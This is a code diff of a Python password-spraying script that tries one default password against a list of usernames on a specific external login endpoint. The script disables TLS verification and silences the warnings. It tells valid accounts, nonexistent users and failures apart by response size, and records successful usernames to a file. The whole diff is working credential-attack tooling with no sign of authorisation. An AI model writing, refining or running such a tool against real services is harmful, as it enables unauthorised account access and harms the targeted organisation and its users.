@@ -1,7 +1,10 @@
 import os 
 import sys 
 import requests
-from termcolor import colored
+import warnings
+
+# Suppress InsecureRequestWarning
+warnings.filterwarnings("ignore", message="Unverified HTTPS request is being made.*")
 
 url = "https://connections.marvel.ru/files/j_security_check"
 headers = {
@@ -21,20 +24,22 @@ headers = {
     "Te": "trailers",
 }
 
+session = requests.Session()
+
 def PostReq():
-    with requests.Session() as session:
-        Password = Passworddef()
-        with open('Test.txt', 'r') as file:
-            for mail in file:
-                mail = mail.strip()
-                data = {
-                    "service.name": "files",
-                    "secure": "true",
-                    "fragment": "",
-                    "j_username": mail,
-                    "j_password": Password
-                }
-                SendReq(session, url, headers, data) 
+    global mail
+    Password = Passworddef()
+    with open('Users.txt', 'r') as file:
+        for mail in file:
+            mail = mail.strip()
+            data = {
+                "service.name": "files",
+                "secure": "true",
+                "fragment": "",
+                "j_username": mail,
+                "j_password": Password
+            }
+            SendReq(session, url, headers, data) 
 
 def Passworddef():
     Passwd = input("Enter the default Password: ")
@@ -42,14 +47,19 @@ def Passworddef():
     return Passwd
 
 def SendReq(session, url, headers, data):
-    print("Requested URL with JSON Data:", url)
-    print("Headers:", headers)
-    print("Data:", data)
     response = session.post(url, headers=headers, data=data, verify=False)
     response_size = len(response.content)
-    print("The Request Sent:", response.text)
-    print("Data Sent:", response)
+    print("Tested UserName: " + mail)
+    if response_size == 2979:
+        print("Correct Attempt")
+        with open("correct_attempts.txt", "a") as f:
+            f.write(f"Tested UserName: {mail}\n")
+    elif response_size == 17327:
+        print("Not exist")
+    else:
+        print("Not Correct")
     print("Response Size:", response_size)
+    print("-------------------------------------\n")
 
 def main():
     PostReq()
